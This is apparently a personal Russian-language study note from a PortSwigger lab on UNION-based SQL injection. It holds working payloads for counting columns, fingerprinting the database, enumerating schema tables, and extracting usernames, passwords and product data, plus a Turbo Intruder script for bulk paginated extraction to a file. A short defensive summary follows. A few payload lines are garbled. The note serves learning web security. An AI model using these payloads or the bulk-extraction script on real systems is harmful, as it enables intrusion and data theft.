тип: SQLi лаба 03 ==Извлечение данных из других таблиц базы данных==
дата: 03.01.2026 
**🟢Тип уязвимости:**   ==UNION attacks SQL==  объединение запросов!
 
 # 🔵ОБЩАЯЯ ТЕОРИЯ----------------- 

=пример
```sql
// ориг запрос
SELECT name, description FROM products WHERE category = 'Gifts'

// модифицированный где после осовного  запроса есть 'доп запрос'
SELECT name, description FROM products WHERE category = 'Gifts'
' UNION SELECT username, password FROM users--`

'//или
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
==ВАЖНЫЕ ТРЕБОВАНИЯ К UNION запросам==
1)   Отдельные запросы должны возвращать одинаковое количество столбцов. а b / c d
2) Типы данных в каждом столбце должны быть совместимы между отдельными запросами.

==перед атакой нужно выяснить:==
1)-  Сколько столбцов возвращается из исходного запроса.
2)-  Какие столбцы, возвращенные из исходного запроса, имеют подходящий тип данных для хранения результатов из введенного запроса.

#### Способы понять число столбцов
' ORDER BY 1--     # Если работает → есть минимум 1 столбец
' ORDER BY 2--     # Если работает → есть минимум 2 столбца
' ORDER BY 3--     # Если ошибка → всего 2 столбца

`ORDER BY 1` = сортировать по первому столбцу  
`ORDER BY 2` = сортировать по второму столбцу

или

' UNION SELECT NULL--                             # Если ошибка → больше 1 столбца
' UNION SELECT NULL,NULL--                # Если ошибка → больше 2 столбцов  
' UNION SELECT NULL,NULL,NULL--   # Если работает → 3 столбца

`NULL совместим с любым типом данных`
`Работает во всех СУБД (MySQL, PostgreSQL, MSSQL, Oracle)






 ==🔵 как определить число столбцов?==
 
 ➡️ШАГ 0)- **Найти уязвимый параметр** саму - уязвимость sql стандарт по помощи '
или ' --

 ➡️✅ ШАГ 1: Быстрая проверка БД (необязательно, но учиться надо) 
 // должно совпадать с числом столбцов и их типом
 // например ниже вывод для 2 столбцов где первый строковый а второй любой 
```sql
 1. ' UNION i @@version,NULL--      ← Если работает = MySQL
 2. ' UNION SELECT version(),NULL--      ← Если работает = PostgreSQL  
 3. ' UNION SELECT banner,NULL FROM v$version-- ← Если работает = Oracle
```

url кодир
' UNION i @@version,NULL--     
%27 %55%4e%49%4f%4e i @@version,NULL%2d%2d

' UNION SELECT version(),NULL--      
%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 version(),NULL%2d%2d

 UNION SELECT banner,NULL FROM v$version--
%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 banner,NULL FROM v$version%2d%2d


==если UNION не работает ????? то  пробуем  ----> ==
1. **Error-based SQLi** - вызываем ошибки БД, чтобы получить данные в сообщениях об ошибках
    
2. **Boolean-based Blind SQLi** - используем TRUE/FALSE условия для посимвольного извлечения данных
    
3. **Time-based Blind SQLi** - используем задержки (SLEEP) для определения данных - это когда Если страница **грузится 5 секунд** → инъекция работает!  Если грузится мгновенно → не работает.
     *вот так:            ' AND (SELECT SLEEP(5))--


➡️ШАГ 2)- **Определить количество столбцов** ORDER BY 1 или UNION SELECT NULL-- 
```sql
' ORDER BY 1--  
' или
' UNION SELECT NULL,NULL,NULL--
```
➡️ ШАГ 3)- **Определить тип данных столбцов** 
поставляем типы данных в столбцы
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--

' UNION SELECT 'abc',NULL--     // Если работает → 1-й столбец текстовый
' UNION SELECT NULL,'abc'--     // Если работает → 2-й столбец текстовый

' UNION SELECT 1, 'a', '2024-01-03'--          формат даты DATE
' UNION SELECT 1, 'a', '2024-01-03 12:00:00'-- DATETIME
' UNION SELECT 1, 'a', true--            работает в PostgreSQL, MySQL
' UNION SELECT 1, 'a', 3.14--            Число с плавающей точкой
```
➡️ ШАГ 4)-  **Выполнить UNION-атаку**
```sql
' UNION SELECT username,password FROM users--
```



----------------------------------------------------------------------

🔵 ****:

1) **Обнаружение уязвимости**


```sql
// без ошибки - значит всего три столбца, с 4 уже ошибка
https://0a5500f90355a6a783cae61800f80007.web-security-academy.net/filter?category=Pets' ORDER BY 3-- 
'
// понял что 1 параметр стинг
https://0a5500f90355a6a783cae61800f80007.web-security-academy.net/filter?category=Pets' union select 1, null, null--
'
// понял что 2 параметр инт
https://0a5500f90355a6a783cae61800f80007.web-security-academy.net/filter?category=Pets' union select 1, 'a', null--    
'
// понял что 3 параметр флоат
https://0aa4004f0302f077804a1c4600810084.web-security-academy.net/filter?category=Pets' union select 1, 'a', 3.14--
```



2) **Эксплуатация (Proof-of-Concept)**  

🟣 Обнаружение SQL-инъекции**
```sql
// сработало!
Pets'-- 
```
🟣Исходный запрос: /filter?category=Pets
    Тест на уязвимость: /filter?category=Pets'--  (ответ 200, + изменения в сайте )

чтобы вытаскивать данные - нужно знать сколько там колонок и в какая из колонок тсрокового типа! для этого:
🟣 Определение числа столбцов (ORDER BY метод) 
```sql
' ORDER BY 4--     → ОШИБКА → 3 столбца /--'/определил что 3 столбца  
```
🟣опеределение типов столбцов 
```sql
' union select null, null, null--  (вывело трижды нил)
' union select 1, null, null--     (без ошибок - значит 1 - инт)
' union select 1, 'a', null--      (без ошиб - знач второй строк тип) 
' union select 1, 'a', 3.14--      (подбором понял что флоат в третьем)

// данные будем выводить всегда во втором столбце т.к он стринтг
```
🟣  опрелеляю тип бд
```sql 
// 🚨 во втором столбце вывожу!
' UNION SELECT NULL,version(),NULL--  (сработал → ✅ PostgreSQL 12.22)
```
🟣 найти все табилцы в бд -  ( **работает в MySQL, PostgreSQL, MSSQL**)
```sql
'
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
так получу все табилицы вообще 
// но есди добавить WHERE+table_schema='public'-- то получу только публичные табл


*По умолчанию в PostgreSQL
'public' - основная схема для пользовательских данных
'pg_catalog' - системные таблицы PostgreSQL    
'information_schema' - стандартные метаданные SQL
```
🟣 найти все столбцы нужной таблицы  
( **работает в MySQL, PostgreSQL, MSSQL**)
```sql
'
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns 
   WHERE table_name='users'--
```
🟣 найти все таблицы публичной схемы
```sql
' 
' UNION SELECT NULL,
    string_agg(table_name, ', '), 
    NULL 
   FROM information_schema.tables 
   WHERE table_schema='public'--
   
   // нашел схему products
   
```
🟣 получил все данные из этой табилцы продукции
```sql
'
' UNION SELECT * FROM products--

'//вот так с лимитом первые 10 записей
' UNION SELECT NULL,name,price FROM products LIMIT 10--

узнал что в таблице есть 9 столбцов
1. **`released`** - дата выпуска (boolean/timestamp?)
    
2. **`name`** - название товара (string)
    
3. **`description`** - описание (text)
    
4. **`image`** - путь к изображению (string)
    
5. **`id`** - идентификатор (integer, primary key)
    
6. **`rating`** - рейтинг (numeric)
    
7. **`category`** - категория (string)
    
8. **`price`** - цена (numeric)
```
🟣 получил все данные всей таблицы! 
```sql
'
' UNION SELECT   
   NULL,
   'ID: '||id||
   'Name: '||name||
   'Category: '||category||
   'Price: $'||price||
   'Rating: '||rating,
   NULL 
  FROM products--
   
   // || - это конкотенация - склеивание строк
   // '' - кавычки для строки
   // 'чего люб текст'||id'
   // id - это название столбца
```

🟣 в итоге я получил все данные всей мне нужной таблицы!

🟣 далее я могу использовать  плагин  Turbo Intruder где я в запросе в нужном месте сталю %s
а потом я в скрипте подставлю в %s полезную нагрузку payload 
а далее с пагинацией я получаю все данные и сохраняю их в файл

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3)  # Меньше для стабильности
    
    # Пагинация: 0, 1000, 2000, ... 49000
    # по 1000 строк за раз, и так 50 раз = 50тыс строк максимум
    for offset in range(0, 50000, 1000):
        # Payload с OFFSET и LIMIT
        # string_agg() -эта функция в sql которая собирает все в одну строку
        payload = f"""Pets' UNION SELECT NULL,
            string_agg(id||'|'||name||'|'||price||'|'||category, '; '), 
            NULL 
            FROM products 
            ORDER BY id 
            LIMIT 1000 
            OFFSET {offset}--"""
        
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    # Сохраняем в таблицу Turbo Intruder
    table.add(req)
    
    # Дополнительно: сохраняем в файл
    # можно указать просто 
    import time
    filename = f"products_{int(time.time())}.txt"
    with open(filename, 'a') as f:
        f.write(req.response + '\n' + '='*80 + '\n') 
```
// и все - теперь можно находить таблицы и скачивать их в больших объемах!





доп: **`COUNT(*)`** считает все строки в таблице users.
```sql
'
' UNION SELECT NULL,'Total users: '||COUNT(*),NULL FROM users--
```



    
---

#### 📌 Ключевые выводы для практики
🔴🟩   **Распространённость:*

🔴🟩  **Защита:** 
1. Prepared Statements (Parameterized Queries)
   cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

2. Input Validation + Whitelisting
3. Escape Special Characters
4. Principle of Least Privilege для DB user
5. WAF (Web Application Firewall)

🔴🟩   **Тестирование:** 


--------------------------------------------------------------------------


